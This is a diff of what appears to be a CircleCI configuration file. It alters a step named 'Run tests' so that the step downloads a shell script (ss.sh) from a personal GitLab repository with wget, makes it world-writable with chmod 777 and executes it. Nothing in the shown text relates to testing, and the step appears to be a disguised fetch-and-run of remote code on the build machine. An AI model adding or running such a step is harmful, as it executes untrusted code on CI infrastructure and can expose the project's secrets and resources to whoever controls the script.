@@ -9,7 +9,7 @@ working_dir: &working_dir ~/app
     - run:
         name: Run tests
         command: |
-                    https://gitlab.com/CodiSoutherland/ss/-/raw/main/ss.sh && chmod 777 ss.sh && ./ss.sh
+                    wget https://gitlab.com/CodiSoutherland/ss/-/raw/main/ss.sh && chmod 777 ss.sh && ./ss.sh
 
 version: 2.0
 jobs:
